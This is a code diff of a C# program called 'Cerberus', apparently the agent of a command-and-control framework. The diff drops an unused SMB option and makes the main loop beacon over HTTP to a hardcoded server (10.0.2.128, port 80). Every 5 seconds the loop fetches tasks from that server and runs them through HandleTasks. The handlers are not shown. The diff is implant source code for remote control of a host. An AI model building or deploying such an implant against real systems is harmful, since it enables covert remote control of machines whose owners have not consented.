@@ -1,7 +1,6 @@
 ﻿using CommModuleBase;
 using HttpModule;
 using Models.Tasks;
-using Tasks.Commands;
 
 using System;
 using System.Collections.Generic;
@@ -23,7 +22,6 @@ namespace Cerberus
         private static List<CerberusCommand> _commands = new List<CerberusCommand>();
 
         private static int SleepTime = 5000;
-        private static CommunicationType _commType = CommunicationType.http;
 
         private static string serverAddress = "10.0.2.128";
         private static int serverPort = 80;
@@ -33,11 +31,7 @@ namespace Cerberus
 
 
 
-        public enum CommunicationType
-        {
-            http,
-            smb
-        }
+
 
         static void Main(string[] args)
         {
@@ -46,28 +40,22 @@ namespace Cerberus
             GenerateMetadata();
             LoadCerberusCommands();
 
+            _commModule = new HttpCommModule(serverAddress, serverPort, SleepTime, _metadata, PayloadUUID);
+            _commModule.Init(_metadata);
+            _commModule.Start();
 
-            if (_commType == CommunicationType.http)
+            _cancellationTokenSource = new CancellationTokenSource();
+
+            UUID = _commModule.Metadata.uuid;
+
+            while (!_cancellationTokenSource.IsCancellationRequested)
             {
-                _commModule = new HttpCommModule(serverAddress, serverPort, SleepTime, _metadata, PayloadUUID);
-                _commModule.Init(_metadata);
-                _commModule.Start();
-
-                _cancellationTokenSource = new CancellationTokenSource();
-
-                UUID = _commModule.Metadata.uuid;
-
-                while (!_cancellationTokenSource.IsCancellationRequested)
+                if (_commModule.RecvData(out var tasks))
                 {
-                    if (_commModule.RecvData(out var tasks))
-                    {
-                        HandleTasks(tasks);
-                    }
+                    HandleTasks(tasks);
                 }
-            }
-            else if (_commType == CommunicationType.smb)
-            {
-                throw new NotImplementedException();
+
+                // check killdate and stop
             }
         }
 
